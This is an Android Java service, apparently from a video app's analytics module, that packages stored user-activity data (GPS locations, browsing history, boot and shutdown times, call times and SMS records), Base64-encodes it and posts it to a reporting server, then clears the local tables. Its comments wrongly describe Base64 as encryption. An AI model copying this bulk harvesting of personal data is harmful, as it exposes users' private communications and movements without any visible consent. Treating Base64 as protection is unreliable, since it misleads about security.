package tv.pps.bi.proto;

import org.apache.commons.codec.binary.Base64;

import tv.pps.bi.db.DBAPPManager;
import tv.pps.bi.db.DBOperation;
import tv.pps.bi.db.config.DBConstance;
import tv.pps.bi.db.config.TagConstance;
import tv.pps.bi.db.config.URL4BIConfig;
import tv.pps.bi.proto.model.SendTime;
import tv.pps.bi.proto.model.UserActivity;
import tv.pps.bi.utils.LogUtils;
import tv.pps.bi.utils.ProtoNetWorkManager;
import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;

/**
 * 投递用户行为数据 服务类
 * @author jiangqingqing
 * @time 2013/10/24
 */
public class SendUserActivityService extends IntentService{

	private MessageToEntityService mMsgService; // 获取用户行为信息 进封装成实体对象
	private ProtoBuffUserActivityService mProtoBuffUserActivityService;
	private UserActivity mUserActivity;
	private byte[] infoBytes;                   //protobuff格式化的的字节数组
	private Base64 base64;
	private Context mContext;
	public SendUserActivityService()
	{
		super("投递数据...");
	}
	

	@Override
	public void onCreate() {
		mContext=this;
		super.onCreate();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
	}

	@Override
	public IBinder onBind(Intent intent) {
		return super.onBind(intent);
	}

	@SuppressWarnings("static-access")
	@Override
	protected void onHandleIntent(Intent intent) {
		mMsgService = new MessageToEntityService(mContext);
		mUserActivity = mMsgService.getMsgUserEntity();
		//mMsgService.close();//关闭数据库
		mProtoBuffUserActivityService = new ProtoBuffUserActivityService();
		infoBytes = mProtoBuffUserActivityService
				.getConstructorData(mUserActivity);
		LogUtils.v(TagConstance.TAG_SENDDATA, "要post的ProtoBuff数据为:" + new String(infoBytes));
		// 进行加密
		// base64 = new Base64();
		// post_str = new String(base64.encodeBase64Chunked(infoBytes));
		// 进行加密 上传
					base64 = new Base64();
					int flag=0; //发送次数标志位
					boolean result=false ;
					
					DBOperation operation = new DBOperation(mContext);
					long send_time=System.currentTimeMillis();
					SendTime mSendTime=operation.getSendTime();
					if(mSendTime!=null&&(send_time-operation.getSendTime().getSendtime()<10*60*1000))
					{
						LogUtils.v(TagConstance.TAG_SENDDATA, "十分钟之内已经投递过数据，暂时不投递");
					}else {
						while(flag<5) //退出循环的时机：1,五次循环主动结束.2,发送成功
						{
							result= ProtoNetWorkManager
									.postUserActivityByByte(
											base64.encodeBase64Chunked(infoBytes),URL4BIConfig.DELIVER_URL);
							flag++;
							if(result)
								break;
						}
						
//						result= ProtoNetWorkManager
//								.postUserActivityByByte(
//										base64.encodeBase64Chunked(infoBytes),ProtoNetWorkManager.DELIVER_URL);
						if (result) {
							//删除发送成功的数据表中的数据,并且记录下当前发送成功的时间 添加到数据库中
							LogUtils.i(TagConstance.TAG_SENDDATA, "增量数据发送成功，准备删除数据库中的数据表");
							DBAPPManager manager=DBAPPManager.getDBManager(mContext); 	
							manager.delete();
							operation.deleteRecordsInTable(DBConstance.TABLE_GPS);  //删除GPS信息数据
							operation.deleteRecordsInTable(DBConstance.TABLE_URL);     //删除网页浏览记录信息数据
							operation.deleteRecordsInTable(DBConstance.TABLE_BOOT_TIME); //删除系统开机时间信息数据
							operation.deleteRecordsInTable(DBConstance.TABLE_SHUT_TIME);
							operation.deleteRecordsInTable(DBConstance.TABLE_PHONE); //删除打电话时间的信息数据
							operation.deleteRecordsInTable(DBConstance.TABLE_SMS); //删除发短信信息数据
							//把投递数据的记录插入到数据库中
							operation.deleteSendTime();
						    boolean insert_flag=operation.insertSendTime(new SendTime(send_time));
							if(insert_flag)
							{
								LogUtils.v(TagConstance.TAG_SENDDATA, "投递记录插入数据库成功");
							}
							
							//LogUtils.i(TagConstance.TAG_SENDDATA, "插入的数据为:"+operation.getSendTime().getSendtime());
							LogUtils.i(TagConstance.TAG_SENDDATA, "成功删除数据库中的数据表");
							LogUtils.v(TagConstance.TAG_SENDDATA, "Post请求返回结果为：成功");
					}
					}
				
					operation.close();
	}
	/**
	 * 开启后台线程进行Post用户行为信息
	 */
	Runnable Runnable_PostMsg = new Runnable() {
		@SuppressWarnings("static-access")
		@Override
		public void run() {
			// 进行加密 上传
			base64 = new Base64();
			int flag=0; //发送次数标志位
			boolean result=false ;
			
			DBOperation operation = new DBOperation(mContext);
			long send_time=System.currentTimeMillis();
			SendTime mSendTime=operation.getSendTime();
			if(mSendTime!=null&&(send_time-operation.getSendTime().getSendtime()<10*60*1000))
			{
				LogUtils.v(TagConstance.TAG_SENDDATA, "十分钟之内已经投递过数据，暂时不投递");
			}else {
				while(flag<5) //退出循环的时机：1,五次循环主动结束.2,发送成功
				{
					result= ProtoNetWorkManager
							.postUserActivityByByte(
									base64.encodeBase64Chunked(infoBytes),URL4BIConfig.DELIVER_URL);
					flag++;
					if(result)
						break;
				}
				
//				result= ProtoNetWorkManager
//						.postUserActivityByByte(
//								base64.encodeBase64Chunked(infoBytes),ProtoNetWorkManager.DELIVER_URL);
				if (result) {
					//删除发送成功的数据表中的数据,并且记录下当前发送成功的时间 添加到数据库中
					LogUtils.i(TagConstance.TAG_SENDDATA, "增量数据发送成功，准备删除数据库中的数据表");
					DBAPPManager manager=DBAPPManager.getDBManager(mContext); 	
					manager.delete();
					operation.deleteRecordsInTable(DBConstance.TABLE_GPS);  //删除GPS信息数据
					operation.deleteRecordsInTable(DBConstance.TABLE_URL);     //删除网页浏览记录信息数据
					operation.deleteRecordsInTable(DBConstance.TABLE_BOOT_TIME); //删除系统开机时间信息数据
					operation.deleteRecordsInTable(DBConstance.TABLE_SHUT_TIME);
					operation.deleteRecordsInTable(DBConstance.TABLE_PHONE); //删除打电话时间的信息数据
					operation.deleteRecordsInTable(DBConstance.TABLE_SMS); //删除发短信信息数据
					//把投递数据的记录插入到数据库中
					operation.deleteSendTime();
				    boolean insert_flag=operation.insertSendTime(new SendTime(send_time));
					if(insert_flag)
					{
						LogUtils.v(TagConstance.TAG_SENDDATA, "投递记录插入数据库成功");
					}
					
					//LogUtils.i(TagConstance.TAG_SENDDATA, "插入的数据为:"+operation.getSendTime().getSendtime());
					LogUtils.i(TagConstance.TAG_SENDDATA, "成功删除数据库中的数据表");
					LogUtils.v(TagConstance.TAG_SENDDATA, "Post请求返回结果为：成功");
			}
			}
		
			operation.close();
		}
	};
}
